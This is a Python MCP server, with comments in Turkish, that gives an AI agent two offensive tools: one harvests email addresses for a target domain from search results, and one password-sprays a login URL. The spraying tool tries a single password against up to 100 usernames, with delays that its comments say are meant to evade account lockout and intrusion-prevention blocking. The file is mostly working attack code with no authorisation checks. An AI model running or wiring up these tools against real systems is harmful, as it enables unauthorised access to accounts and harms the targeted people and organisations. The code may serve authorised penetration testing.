#!/usr/bin/env python3
"""
mcp-osint-tools: Gelişmiş OSINT ve Password Spraying Sunucusu
CCO için e-posta toplama ve hesabı kilitlemeden güvenli parola püskürtme işlemleri.
"""

import os
import json
import time
import requests
import shlex
import urllib.parse
from mcp.server.fastmcp import FastMCP

# Sunucu oluştur
mcp = FastMCP("mcp-osint-tools")

@mcp.tool()
def gather_emails(domain: str, max_pages: int = 2) -> str:
    """Belirtilen domain için arama motorları üzerinden basit e-posta keşfi yapar (Google Dorks / OSINT).
    
    Args:
        domain: Hedef domain (örn: example.com)
        max_pages: Arama yapılacak maksimum sayfa sayısı
    """
    # Not: Gerçek hayatta burada theHarvester, gitrecon, veya Hunter.io API'si entegre edilir.
    # Bu basit bir simülasyon/örnek aracıdır.
    import re
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)"
    }
    
    emails = set()
    queries = [
        f'"{domain}" email',
        f'"@"{domain}" contact',
    ]
    
    for query in queries:
        try:
            url = f"https://html.duckduckgo.com/html/?q={urllib.parse.quote(query)}"
            r = requests.get(url, headers=headers, timeout=15)
            
            # Basit regex ile e-posta arama
            found = re.findall(r'[a-zA-Z0-9.\-_]+@' + re.escape(domain), r.text, re.IGNORECASE)
            for f in found:
                emails.add(f.lower())
                
            time.sleep(2) # Ban yememek için bekleme
        except Exception:
            pass

    summary = {
        "domain": domain,
        "emails_found": list(emails),
        "total": len(emails),
        "note": "Gerçek sonuçlar için 'theHarvester' komutunu kali üzerinden tetikleyebilirsiniz."
    }
    
    return json.dumps(summary, indent=2, ensure_ascii=False)


@mcp.tool()
def password_spray_structured(target_url: str, usernames_file: str, password: str, delay_sec: int = 5, timeout_sec: int = 15) -> str:
    """Belirtilen bir URL'ye (Basic Auth, OWA veya basit POST login) yavaşça şifre dener.
    Account Lockout olmasını engellemek için her deneme arasına gecikme (delay) ekler.
    
    Args:
        target_url: Hedef Login URL'i
        usernames_file: Kullanıcı adlarının bulunduğu dosya yolu (Her satırda bir kullanıcı)
        password: Denenecek TEK şifre
        delay_sec: Her istek arası beklenecek saniye (Varsayılan: 5s)
        timeout_sec: Her istek için HTTP timeout süresi
    """
    if not os.path.exists(usernames_file):
        return json.dumps({"error": f"Dosya bulunamadı: {usernames_file}"})
        
    try:
        with open(usernames_file, "r") as f:
            users = [line.strip() for line in f if line.strip()]
    except Exception as e:
        return json.dumps({"error": f"Dosya okuma hatası: {e}"})

    if not users:
        return json.dumps({"error": "Kullanıcı listesi boş."})

    results = []
    successes = []
    
    # Çok fazla kullanıcı varsa (örn: 1000+), proxy veya daha iyi bir strateji gerekebilir.
    # Şimdilik en fazla ilk 100 kullanıcıyı deniyoruz.
    users = users[:100]

    for i, user in enumerate(users):
        try:
            # Örnek olarak HTTP Basic Auth denemesi
            # Gerçek senaryoda POST datası da dinamik olarak tool'a eklenebilir.
            r = requests.get(target_url, auth=(user, password), timeout=timeout_sec, verify=False)
            
            if r.status_code not in [401, 403, 429]:
                # Eğer 401 Unauthorized dönmediyse, büyük ihtimalle şifre doğru veya login portal değil
                successes.append({"username": user, "password": password, "status": r.status_code})
            
            if r.status_code == 429:
                results.append({"error": "Rate Limit / 429 Too Many Requests alındı. Tarama durduruluyor."})
                break
                
        except Exception as e:
            results.append({"username": user, "error": str(e)})
            
        # İstekler arasına lockout ve IPS engelini aşmak için bekleme ekle
        if i < len(users) - 1:
            time.sleep(delay_sec)
            
    summary = {
        "target": target_url,
        "users_tested": len(users),
        "password_tried": password,
        "successful_logins": successes,
        "errors": len(results)
    }
    
    return json.dumps(summary, indent=2, ensure_ascii=False)


if __name__ == "__main__":
    mcp.run()
